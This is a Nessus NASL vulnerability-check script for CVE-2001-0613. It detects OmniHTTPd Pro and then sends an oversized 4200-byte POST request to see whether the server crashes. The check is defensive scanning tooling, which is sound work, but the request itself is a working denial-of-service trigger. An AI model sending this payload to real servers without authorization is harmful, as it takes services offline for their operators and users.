#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
#  Ref: SNS Research  - <vuln-dev@greyhack com>
# 
#  This script is released under the GNU GPLv2
#

if(description)
{
 script_id(15553);
 script_bugtraq_id(2730);
 script_cve_id("CVE-2001-0613");
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"1829");
 
 script_version("$Revision: 1.1 $");
 
 name["english"] = "OmniHTTPd pro long POST DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running OmniHTTPd Pro HTTP Server.

The remote version of this software seems to be vulnerable to a buffer 
overflow when handling specially long POST request. This may allow an
attacker to crash the remote service, thus preventing it from answering 
legitimate client requests.

Solution : None at this time
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Test OmniHTTPd pro long POST DoS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
  script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "Denial of Service";
 
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0);
if ( http_is_dead(port:port) ) exit(0);


banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if ( ! egrep(pattern:"^Server: OmniHTTPd", string:banner ) ) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

len = 4200;	# 4111 should be enough
req = string("POST ", "/", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
send(socket:soc, data:req);
http_close_socket(soc);

sleep(1);

if(http_is_dead(port: port))
{
 security_hole(port);
 exit(0);
} 
